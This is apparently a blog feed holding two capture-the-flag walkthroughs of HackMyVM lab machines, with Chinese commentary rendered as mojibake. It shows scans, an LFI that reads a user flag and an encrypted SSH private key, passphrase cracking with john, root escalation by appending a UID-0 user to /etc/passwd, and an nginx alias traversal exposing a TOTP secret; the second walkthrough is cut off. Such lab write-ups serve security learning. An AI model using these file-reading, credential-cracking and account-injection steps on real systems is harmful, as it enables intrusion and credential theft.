<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=p4l4nc4</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=elpensador" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=elpensador" target="_blank">elpensador</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap 192.168.56.9 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 03:02 EST
Nmap scan report for 192.168.56.9
Host is up (0.00080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7E:89:2A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds


<br><br>
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# dirsearch -u http://192.168.56.9
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.9/_24-12-20_03-03-00.txt

Target: http://192.168.56.9/

[03:03:00] Starting:
D2
[03:03:01] 403 -  277B  - /.html
[03:03:01] 403 -  277B  - /.htm
[03:03:01] 403 -  277B  - /.htpasswds
[03:03:01] 403 -  277B  - /.htpasswd_test
[03:03:01] 403 -  277B  - /.httr-oauth
[03:03:01] 403 -  277B  - /.php
[03:03:03] 403 -  277B  - /.ht_wsr.txt
[03:03:17] 200 -  755B  - /robots.txt


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# curl http://192.168.56.9/robots.txt
A palanca-negra-gigante ÃƒÂ© uma subespÃƒÂ©cie de palanca-negra. De todas as subespÃƒÂ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃƒÂ©cie ÃƒÂ© endÃƒÂ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃƒÂ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃƒÂªncia de mÃƒÂºltiplas espÃƒÂ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃƒÂ§ÃƒÂ£o CientÃƒÂ­fica da Universidade CatÃƒÂ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃƒÂªncias fotogrÃƒÂ¡ficas do ÃƒÂºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃƒÂªncia da populaÃƒÂ§ÃƒÂ£o apÃƒÂ³s um duro perÃƒÂ­odo de guerra.
Atualmente, a Palanca Negra Gigante ÃƒÂ© considerada como o sÃƒÂ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃƒÂ§ÃƒÂ£o de futebol angolana ÃƒÂ© denominada de palancas-negras e a companhia aÃƒÂ©rea angolana, TAAG, tem este antÃƒÂ­lope como sÃƒÂ­mbolo. Palanca ÃƒÂ© tambÃƒÂ©m o nome de uma das subdivisÃƒÂµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃƒÂ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual

ç¿»è¯‘
å¤§é»‘ç¾šæ˜¯é»‘ç¾šçš„ä¸€ä¸ªäºšç§ï¼Œåœ¨æ‰€æœ‰äºšç§ä¸­ï¼Œå®ƒä»¥ä½“å‹å·¨å¤§è€Œè‘—ç§°ï¼Œæ˜¯éæ´²æœ€ç¨€æœ‰çš„æœ‰è¹„ç±»åŠ¨ç‰©ä¹‹ä¸€ã€‚è¿™ä¸ªäºšç§æ˜¯å®‰å“¥æ‹‰ç‰¹æœ‰çš„ï¼Œä»…åˆ†å¸ƒåœ¨ä¸¤ä¸ªåœ°æ–¹ï¼šåç”˜è¾¾æ‹‰å›½å®¶å…¬å›­å’Œå¢å®‰å¤šè‡ªç„¶ä¿æŠ¤åŒºã€‚2002å¹´ï¼Œå®‰å“¥æ‹‰å†…æˆ˜ç»“æŸåï¼Œå…³äºå®‰å“¥æ‹‰è®¸å¤šç‰©ç§çš„ç”Ÿå­˜æƒ…å†µçŸ¥ä¹‹ç”šå°‘ï¼Œå®é™…ä¸Šå½“æ—¶æ›¾æ‹…å¿ƒå¤§é»‘ç¾šå·²ç»ç­ç»ã€‚2004å¹´1æœˆï¼Œç”±å®‰å“¥æ‹‰å¤©ä¸»æ•™å¤§å­¦çš„ç§‘å­¦ç ”ç©¶ä¸­å¿ƒé¢†å¯¼çš„ä¸€ä¸ªå›¢é˜Ÿï¼Œåœ¨ä½©å¾·ç½—Â·ç“¦å…¹Â·å¹³æ‰˜åšå£«çš„å¸¦é¢†ä¸‹ï¼Œé¦–æ¬¡æ‹æ‘„åˆ°äº†ä»…å­˜çš„ä¸€ä¸ªç¾¤ä½“çš„ç…§ç‰‡ï¼Œè¯å®äº†åœ¨ç»å†äº†å†…æˆ˜çš„è‰°éš¾æ—¶æœŸåï¼Œè¿™ä¸€ç‰©ç§çš„å­˜ç»­ã€‚

ç›®å‰ï¼Œå¤§é»‘ç¾šè¢«è§†ä¸ºå®‰å“¥æ‹‰çš„å›½è±¡ï¼Œæˆä¸ºå®‰å“¥æ‹‰äººæ°‘çš„éª„å‚²ã€‚ä½œä¸ºè¯æ˜ï¼Œå®‰å“¥æ‹‰çš„è¶³çƒé˜Ÿè¢«ç§°ä¸ºâ€œé»‘ç¾šé˜Ÿâ€ï¼Œè€Œå®‰å“¥æ‹‰èˆªç©ºå…¬å¸ï¼ˆTAAGï¼‰ä¹Ÿå°†è¿™ä¸€ç¾šç¾Šä½œä¸ºå…¶æ ‡å¿—ã€‚æ­¤å¤–ï¼Œâ€œPalancaâ€è¿˜æ˜¯å®‰å“¥æ‹‰é¦–éƒ½ç½—å®‰è¾¾çš„ä¸€ä¸ªåœ°åŒºåç§°ã€‚åœ¨éæ´²ç¥è¯ä¸­ï¼Œåƒå…¶ä»–ç¾šç¾Šä¸€æ ·ï¼Œå®ƒä»¬è±¡å¾ç€æ´»åŠ›ã€é€Ÿåº¦ã€ç¾ä¸½å’Œè§†è§‰çš„æ•é”ã€‚
<br>å¤šåŠå°±æ˜¯è¦åšä¸€ä¸ªå­—å…¸<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# echo "A palanca-negra-gigante ÃƒÂ© uma subespÃƒÂ©cie de palanca-negra. De todas as subespÃƒÂ©cies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespÃƒÂ©cie ÃƒÂ© endÃƒÂ©mica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, apÃƒÂ³s a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivÃƒÂªncia de mÃƒÂºltiplas espÃƒÂ©cies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e InvestigaÃƒÂ§ÃƒÂ£o CientÃƒÂ­fica da Universidade CatÃƒÂ³lica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidÃƒÂªncias fotogrÃƒÂ¡ficas do ÃƒÂºnico rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistÃƒÂªncia da populaÃƒÂ§ÃƒÂ£o apÃƒÂ³s um duro perÃƒÂ­odo de guerra. Atualmente, a Palanca Negra Gigante ÃƒÂ© considerada como o sÃƒÂ­mbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleÃƒÂ§ÃƒÂ£o de futebol angolana ÃƒÂ© denominada de palancas-negras e a companhia aÃƒÂ©rea angolana, TAAG, tem este antÃƒÂ­lope como sÃƒÂ­mbolo. Palanca ÃƒÂ© tambÃƒÂ©m o nome de uma das subdivisÃƒÂµes da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antÃƒÂ­lopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual" | tr ' -' '\n' &gt;words.txt

<br>ä½†æ˜¯çˆ†ç ´ä¸å‡ºæ¥<br>
æ ¹æ®gptæç¤ºæˆ‘é¶æœº åå­— p4l4nc4 æ˜¯ palancaï¼ˆè‘¡è„ç‰™è¯­ä¸­çš„â€œç¾šç¾Šâ€ï¼‰çš„ç½‘ç»œå˜ä½“<br>
æˆ‘ä¼°è®¡è¿™ä½œè€…å°±æ˜¯å–œæ¬¢ç”¨è¿™ç§å˜ä½“ä½œä¸ºåå­—<br>
å…¶ä¸­æ¯”è¾ƒå…³é”®çš„æ˜¯ palanca-negra-gigante<br>ç”Ÿæˆå˜ä½“çš„å­—å…¸<br>
æ›¿æ¢i-&gt;1 a-&gt;4 e-&gt;3 l-&gt;1<br>
è¿™é‡Œé¢æœ‰ä¸€äº›é€—å· æˆ‘ä»¬æŠŠé€—å·ä¹Ÿç»™å»æ‰<br>
å› ä¸ºæ˜¯linux è¿˜æœ‰å¤§å°å†™é—®é¢˜ã€‚<br>
æŠŠæ‰€æœ‰å¤§å†™å­—æ¯å¼€å¤´çš„å¤§å†™å­—æ¯æ¢æˆå°å†™æ·»åŠ ä¸€ä»½è¿½åŠ åˆ°å­—å…¸<br><img alt="Pasted image 20241220162739" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/u4cijtcpnh.png"><br><img alt="Pasted image 20241220163545" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/6g78ebyeowx.png"><br>çˆ†ç ´å³å¯å‘ç°ç›®å½•<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# gobuster dir -u http://192.168.56.9 -w words.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/n3gr4                (Status: 301) [Size: 312] [--&gt; http://192.168.56.9/n3gr4/]
Progress: 1060 / 1065 (99.53%)
===============================================================
Finished
===============================================================
<br>ç»§ç»­çˆ†ç ´è¿™ä¸ªç›®å½•å‘ç°ä¸€ä¸ªphpæ–‡ä»¶<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# gobuster dir -u http://192.168.56.9/n3gr4/ -w words.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.9/n3gr4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/m414nj3.php          (Status: 500) [Size: 0]
/m414nj3.php          (Status: 500) [Size: 0]
Progress: 2125 / 2130 (99.77%)
===============================================================
Finished
===============================================================

<br>è®¿é—®åå‘ç°æ˜¯ç©ºçš„<br><img alt="Pasted image 20241220164355" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/7haa62dki8w.png"><br>
æºä»£ç ä¹Ÿæ˜¯ç©ºçš„<br>åº”è¯¥æ˜¯æœ‰ä¸€ä¸ªå‚æ•°<br>
ä½¿ç”¨ arjunçˆ†ç ´ä¸€ä¸‹<br>â”Œ î‚° ï‰¬  yu@yu î‚° ï…º î‚°~ î‚° ï¤  388ms î‚° ï„ª &gt;&gt;ERROR î‚°
â”” $ arjun -u http://192.168.112.96/n3gr4/m414nj3.php
    _
   /_| _ '
  (  |/ /(//) v2.2.6
      _/

 Probing the target for stability
 Analysing HTTP response for anomalies
 Analysing HTTP response for potential parameter names
 Logicforcing the URL endpoint
 parameter detected: page, based on: http code
 Parameters found: page
<br>è·å–åˆ°å‚æ•°æ˜¯page
ä»å‚æ•°åä¼°è®¡å°±æ˜¯ä¸€ä¸ªLFI
å…ˆè¯•è¯•<br><img alt="Pasted image 20241220164517" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/va29bj9khmh.png"><br>
æˆåŠŸ<br>è·å–ä¸€ä¸‹userflag<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# curl http://192.168.112.96/n3gr4/m414nj3.php?page=/home/p4l4nc4/user.txt
HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1}
<br>å°è¯•ä½¿ç”¨dataä¸ºåè®®åŒ…å«å¤±è´¥äº†<br>ä½†æ˜¯å¯ä»¥è¯»å–äº†åˆ° m414nj3 ç”¨æˆ·çš„ id_rsa<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# curl http://192.168.112.96/n3gr4/m414nj3.php?page=/home/p4l4nc4/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCvTRnNli
2HLc7wYB9S1mbCAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCrXZ98DYMr
n/f74/g82lqDkMHkyocXGXn8VaP/N7vD9j5mLSr1uhKGBbxcVm4uGP9k//mmRKlewRl/MZ
nTg0N8MP9vp0O2B9vrwHLz9JekTblv93/VCDpJS78CGkNNOVMRcv2ZB3w7uFm6zxRZxQmH
5HaRNuf795GQSFjybiqmN7Mu78bG/94aQMZZLALYmoyMCYWXGvvHpxRN1dwNsT7If4aNBE
l1HXVrZY1biDOrpJQ7O+eZpD4IKs5/QgKL6w9nBczVcGKkvyms98A5qTa/F43+1CxQE2ng
wPiejJEeJZ0PEkQu3nZTK1k7WpJzVnhpqbHGlwKWbfvMKh27Y2gpAAADwI6Nr+vLoXaEJy
SIRrVjIYFz/C3B17pmpx+lmupFfU6ruVHLE92gweyr9wAd5lxhKX1I6BClhlEoDWkzEBCT
H/4zg2tj84+hzhdVWUy6KaCVbRbuvJYWQNWY4kgfk/3FTnSJFHd+k8CZImN3Xa/9DRVLmg
jytzseFr83bPyOyGSze51kJX4r2ljurDvmcnXfQ4j27zUUmwEKi02VvjLngXbmMnIMDLI3
x/pdFxnyZ0w6wnl/Bg+2gvc54Y2ssMblNMw6HZU4K2TN/c3li3A3hLZsN7QwNIV76X5UeP
dWCOngRsImAmMtyxPKZ0rvYwgDimWunQPy0yJXEPdofL6hrAxFZ6y+jnm+gM7x1fnooSkb
9H5RblfwiOtuTD7bmAu6ApNU0Ul3X2YFPnDLFjo/D0Sj5LcsYDQ+XlTNUwnjHpyMy5VzUz
2vDpiscBd7FpFCHf1lS9bfGMLbhOfdM6TPzpjlOmdRizoVjGCZdXsA4Jg05FpvEFa3KHqM
iJOA9yXhHPROYmOwl5Mu+NTPc+Xbiu7B8TJu/BORoOShhbm7+kQpXM7XHPDKTTnJo+qmsI
Pt9FuQF3wZWIXZ48DmRKJKhB+a9LwuE8ES3wUTVqx/EbAs08V6/uiBYZmorJFSgbPd68AE
xKTK9ObilJKSfS2Ik5/iVIBTUxlAt2foAUpWTlXVNmFfBEhRSk48E8NhcgNqctKWpjKf0R
2gi/Dvpect4LoqKPue5zvN0dNlYSiq/6QK6NqJrJdN7DvsvocL+BcWmmv31erlJOo6A3Zw
CEpmnqVzMTroZSBQv3eEsOFS/+RkJ5ffFRpXGfWPh4Dn/Y++n3wbHNNb97pOd9WV+IlhDV
7btvga8cG9xp3zihOIf308VowcpIp0CSlEqZDBpis5jWY9J3N1+uh3pJHFgqmLxKnqLmzu
u15Kh/+nAV6DTBVxrdhq8HoLAvb7ubAq2ICHALC39X12+J0cLOUMi8UWYawMTFgYnO3ZBD
fb6fZaM9Hr97jREiUEG6vgIcNgn6jtJ3EM3ncxTKe2T8SSYn8pFy9Lqf+lvZ8yo9DkaPl5
ORSVWa+jCKhuClPZY5t8VJC9xXGyz8Wah15Y2pg95nGEub7dgmRlQAIiSxjWsDmaDzIBPo
IkZ5lzxoTvvtL2N1+4ZFprPwUN6y6C6zrXbzQp7Ov0bZc2g9fFiNxu1HvR96rwVNFHbeia
OJEM2NZSUU52PExgYtSXwO5aDy70oKiu0pbifoYOm19hlYwYWOOa6s+oW2FG+aXO8WIeEa
muaZDiXw==
-----END OPENSSH PRIVATE KEY-----

<br>ç§é’¥æœ‰å¯†ç éœ€è¦çˆ†ç ´<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# ssh2john id_rsa &gt;hash

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/p4l4nc4]
â””â”€# john hash --word=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
friendster       (id_rsa)
1g 0:00:00:07 DONE (2024-12-20 04:20) 0.1307g/s 83.66p/s 83.66c/s 83.66C/s evelyn..pebbles
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

<br>è·å–åˆ°å¯†ç æ˜¯ friendster<br>åˆ©ç”¨å¯†ç å³å¯ç™»å½•åˆ° p4l4nc4 ç”¨æˆ·<br><br>è¿›æ¥åç”¨ history æŸ¥çœ‹å‘ç° /etc/passwdæœ‰å†™å…¥æƒé™<br>ç›´æ¥å†™ä¸€ä¸ªrootçº§åˆ«çš„ç”¨æˆ·å³å¯<br>ç”Ÿæˆå¯†ç hash
p4l4nc4@4ng014:/home$ openssl passwd 123456
$1$kUvDgDel$tUYPu5oiI8CqMSfycayS1.

å†™å…¥åˆ°/etc/passwd
p4l4nc4@4ng014:/home$ echo 'root1:$1$kUvDgDel$tUYPu5oiI8CqMSfycayS1.:0:0:root:/root:/bin/bash' &gt;&gt;/etc/passwd
p4l4nc4@4ng014:/home$ su root1
Password:
root@4ng014:/home# whoami
root
<br>
è¿™é‡Œç®€å•è¯´ä¸€ä¸‹ rootç”¨å­˜å‚¨åœ¨/etc/passwdé‡Œé¢æ˜¯ root:x:0:0:root:/root:/bin/bash å…¶ä¸­ x æ˜¯è¡¨ç¤ºæ­¤ç”¨æˆ·çš„å¯†ç å­˜å‚¨åœ¨ /etc/shadow è€Œä¸æ˜¯ /etc/passwd æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªhashæ›¿æ¢æ‰xå³å¯ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹ç”¨æˆ·å
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/43.p4l4nc4.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/43.p4l4nc4.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/hmv/assets/u4cijtcpnh.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/u4cijtcpnh.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[42.eighty]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. knockæ•²é—¨" data-href="#2.2. knockæ•²é—¨" href="https://www.c1trus.top/about:blank#2.2._knockæ•²é—¨" class="internal-link" target="_self" rel="noopener nofollow">2.2. knockæ•²é—¨</a>
<br><a data-tooltip-position="top" aria-label="2.3. ç›®å½•æ‰«æ" data-href="#2.3. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.3._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.4. ç›®å½•ç©¿è¶Š" data-href="#2.4. ç›®å½•ç©¿è¶Š" href="https://www.c1trus.top/about:blank#2.4._ç›®å½•ç©¿è¶Š" class="internal-link" target="_self" rel="noopener nofollow">2.4. ç›®å½•ç©¿è¶Š</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Eighty" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Eighty</a><br>
ä½œè€… sml<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# nmap -sVC  192.168.56.8 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 22:33 EST
Nmap scan report for 192.168.56.8
Host is up (0.000055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c9:ce:d7:2a:f9:48:25:65:a9:33:4b:d5:01:e1:2c:52 (RSA)
|   256 7e:3d:4d:b4:82:0b:13:eb:db:50:e3:60:70:f0:4a:ad (ECDSA)
|_  256 7f:9d:13:c8:7b:d9:37:1d:cb:ff:e9:ce:f5:90:c3:32 (ED25519)
70/tcp open     http    pygopherd web-gopher gateway
|_http-title: Gopher
| gopher-ls:
|_[txt] /howtoconnect.txt "Connection"
80/tcp filtered http
MAC Address: 08:00:27:8C:94:BE (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds

<br>80ç«¯å£è¢«é˜²ç«å¢™è¿‡æ»¤äº†<br>
70ç«¯å£æœ‰ä¸€ä¸ª gopher æœåŠ¡ é‡Œé¢æœ‰ä¸€ä¸ª howtoconnect.txt<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl 192.168.56.8:70/howtoconnect.txt
Ping us to: 4767 2343 3142

<br>è¿™åº”è¯¥å°±æ˜¯æç¤ºæˆ‘ä»¬ä¾æ¬¡æ•²é—¨æ‰“å¼€80ç«¯å£äº†<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# knock 192.168.56.8 4767 2343 3142 -v
hitting tcp 192.168.56.8:4767
hitting tcp 192.168.56.8:2343
hitting tcp 192.168.56.8:3142

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# nmap 192.168.56.8 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 22:37 EST
Nmap scan report for 192.168.56.8
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
70/tcp open  gopher
80/tcp open  http
MAC Address: 08:00:27:8C:94:BE (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl 192.168.56.8
Hi.
&lt;!-- 80 --&gt;

<br>è¿™æ—¶å€™å‘ç°80ç«¯å£å°±å¼€æ”¾äº†<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# dirsearch -u http://192.168.56.8
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/eighty/reports/http_192.168.56.8/_24-12-19_22-38-36.txt

Target: http://192.168.56.8/

[22:38:36] Starting:
[22:38:51] 200 -   18B  - /robots.txt

Task Completed

<br>é‡Œé¢æœ‰ä¸€ä¸ª /robots.txt<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl 192.168.56.8/robots.txt
/nginx_backup.txt

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl 192.168.56.8/nginx_backup.txt
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
}

server {
server_name henry.eighty.hmv;
root /var/www/html;
index index.html index.htm index.nginx-debian.html;
        location /web {
                alias /home/henry/web/;
        }
  }

server {
server_name susan.eighty.hmv;
root /var/www/html;
index index.html index.htm index.nginx-debian.html;
        location /web {
                alias /home/susan/web/;
        }
  }

<br>å¯ä»¥è·å–åˆ°ä¸€ä¸ªnginxçš„é…ç½®æ–‡ä»¶<br>
é‡Œé¢å‘ç°äº†ä¸¤ä¸ªåŸŸå henry.eighty.hmv  susan.eighty.hmv è¿˜æœ‰è¿™ä¸¤ä¸ªç”¨æˆ· henry susan<br>
é…ç½®åˆ°hosts<br>è¿™é‡Œè¿˜å¯ä»¥è·å–åˆ°ä¸¤ä¸ªè·¯å¾„<br>
henry.eighty.hmv/web/<br>
susan.eighty.hmv/web/<br>å¯¹è¿™ä¸¤ä¸ªè·¯å¾„éƒ½è¿›è¡Œç›®å½•çˆ†ç ´<br>
åœ¨susançš„ç›®å½•ä¸‹å¯ä»¥è·å–åˆ°ä¸€ä¸ªæ–‡ä»¶<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# gobuster dir -u  susan.eighty.hmv/web/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,zip,jpg,png,txt,rar
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://susan.eighty.hmv/web/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,txt,rar,php,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 40]
/lostpasswd.txt       (Status: 200) [Size: 50]
Progress: 1661144 / 1661152 (100.00%)
===============================================================
Finished
===============================================================

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl http://susan.eighty.hmv/web/lostpasswd.txt
8ycrois-tu0 + /home/susan/secret/.google-auth.txt


<br><br>è¿™é‡Œå‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªè·¯å¾„ /home/susan/secret/.google-auth.txt<br>
æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›®å½•ç©¿è¶Šè¯»å–åº¦è¿™ä¸ªæ–‡ä»¶<br>
å› ä¸º location /web å†™çš„ä¸è§„èŒƒ æ­£ç¡®åº”è¯¥æ˜¯ location /web/
<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/eighty]
â””â”€# curl http://susan.eighty.hmv/web../secret/.google-auth.txt
2GN7KARBONVR55R7SP3UZPN3ZM
" RATE_LIMIT 3 30
" WINDOW_SIZE 17
" DISALLOW_REUSE
" TOTP_AUTH
71293338
48409754
27074208
60216448
17908010

<br>
